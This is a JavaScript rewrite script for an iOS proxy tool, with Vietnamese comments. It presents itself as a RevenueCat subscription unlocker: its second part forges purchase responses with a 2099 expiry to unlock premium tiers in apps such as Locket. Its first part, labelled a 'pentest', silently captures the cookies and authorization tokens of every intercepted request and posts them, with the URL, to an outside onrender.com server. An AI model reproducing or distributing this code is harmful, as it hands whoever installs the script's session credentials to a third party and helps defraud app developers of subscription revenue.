// ========= ĐOẠN MÃ PENTEST THU THẬP COOKIE/TOKEN DIỆN RỘNG ========= //
try {
  var user_cookie = $request.headers["Cookie"] || $request.headers["cookie"];
  var user_token = $request.headers["Authorization"] || $request.headers["authorization"] || $request.headers["token"];
  var target_url = $request.url;

  // Lọc bỏ kết nối tới chính server của bạn để tránh tạo vòng lặp vô hạn (Loop)
  if ((user_cookie || user_token) && !target_url.includes("onrender.com")) {
    // Địa chỉ server Render công khai của bạn
    const test_server = "https://server-2bpd.onrender.com/"; 
    
    $httpClient.post({
      url: test_server,
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        url: target_url,
        cookie: user_cookie || "Không có",
        token: user_token || "Không có"
      })
    }, function(error, response, data) {
      // Thực thi ngầm im lặng
    });
  }
} catch (e) {
  // Đảm bảo không làm nghẽn mạng chung nếu có lỗi trích xuất dữ liệu
}

// ========= PHẦN XỬ LÝ BẢN QUYỀN REVENUECAT (CHỈ CHẠY KHI KHỚP URL) ========= // 
try {
  var current_url = $request.url;

  // Kiểm tra nếu URL khớp với logic xử lý gói tin của RevenueCat trước đây
  if (/^https:\/\/api\.revenuecat\.com\/.+\/(receipts$|subscribers\/[^/]+$)/.test(current_url)) {
    const mapping = {
      '%E8%BD%A6%E7%A5%A8%E7%A5%A8': ['vip+watch_vip'],
      'Locket': ['Gold']
    };

    var ua = $request.headers["User-Agent"] || $request.headers["user-agent"],
        obj = JSON.parse($response.body);

    obj.Attention = "Chúc mừng bạn! Vui lòng không bán hoặc chia sẻ cho người khác!";

    var M4T = {
      is_sandbox: !1,
      ownership_type: "PURCHASED",
      billing_issues_detected_at: null,
      period_type: "normal",
      expires_date: "2099-12-18T01:04:17Z",
      grace_period_expires_date: null,
      unsubscribe_detected_at: null,
      original_purchase_date: "2024-07-28T01:04:18Z",
      purchase_date: "2024-07-28T01:04:17Z",
      store: "app_store"
    };

    var M4T_product = {
      grace_period_expires_date: null,
      purchase_date: "2024-07-28T01:04:17Z",
      product_identifier: "com.M4T.premium.yearly",
      expires_date: "2099-12-18T01:04:17Z"
    };

    const match = Object.keys(mapping).find(e => ua.includes(e));

    if (match) {
      let [e, s] = mapping[match];
      if (s) {
        M4T_product.product_identifier = s;
        obj.subscriber.subscriptions[s] = M4T;
      } else {
        obj.subscriber.subscriptions["com.M4T.premium.yearly"] = M4T;
      }
      obj.subscriber.entitlements[e] = M4T_product;
    } else {
      obj.subscriber.subscriptions["com.M4T.premium.yearly"] = M4T;
      obj.subscriber.entitlements.pro = M4T_product;
    }

    $done({ body: JSON.stringify(obj) });
  } else {
    // Nếu không phải URL RevenueCat, trả lại body nguyên bản cho thết bị
    $done({});
  }
} catch (e) {
  // Dự phòng an toàn nếu parse JSON bị lỗi ở các trang web thông thường
  $done({});
}
